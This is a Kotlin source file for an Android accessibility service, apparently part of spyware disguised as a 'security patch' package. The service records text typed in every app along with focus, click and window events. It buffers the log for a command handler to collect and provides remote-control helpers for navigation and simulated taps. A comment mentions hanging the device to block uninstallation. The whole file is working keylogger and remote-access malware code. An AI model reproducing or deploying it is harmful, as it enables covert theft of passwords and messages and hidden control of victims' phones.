package com.android.security.patch

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import com.android.security.patch.commands.Rules

class KeylogService : AccessibilityService() {

    companion object {
        @Volatile var alive = false
        @Volatile var instance: KeylogService? = null
    }

    private val buf = StringBuilder(2048)
    private val lock = Any()

    override fun onServiceConnected() {
        alive = true
        instance = this
        serviceInfo = serviceInfo?.apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = flags or
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
    }

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        e ?: return
        try {
            when (e.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val t = e.text?.joinToString("") ?: return
                    if (t.isNotBlank()) {
                        push("[${e.packageName}] $t")
                    }
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED,
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    val t = e.text?.joinToString("").orEmpty()
                    val c = e.className?.toString().orEmpty()
                    push("[${e.packageName}] focus:$c::$t")
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
                AccessibilityEvent.TYPE_WINDOWS_CHANGED -> {
                    push("[win] ${e.packageName}/${e.className}")
                }
            }

            // cek apakah user buka App Info kita → trigger hang kalau anti-uninstall on
            try {
                Rules.onAccessibilityEvent(this, e)
            } catch (_: Throwable) {}

        } catch (_: Throwable) {}
    }

    override fun onInterrupt() {}

    private fun push(s: String) {
        synchronized(lock) {
            buf.append(s).append('\n')
            if (buf.length > 300_000) buf.delete(0, buf.length - 150_000)
        }
    }

    fun drain(): String {
        synchronized(lock) {
            val out = buf.toString()
            buf.clear()
            return out
        }
    }

    // ---- helpers dipanggil dari command handler ----

    fun goHome(): Boolean = performGlobalAction(GLOBAL_ACTION_HOME)

    fun goBack(): Boolean = performGlobalAction(GLOBAL_ACTION_BACK)

    fun openRecents(): Boolean = performGlobalAction(GLOBAL_ACTION_RECENTS)

    fun openNotifs(): Boolean = performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)

    fun tap(x: Float, y: Float) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return
        val path = Path().apply { moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0L, 60L)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        dispatchGesture(gesture, null, null)
    }
}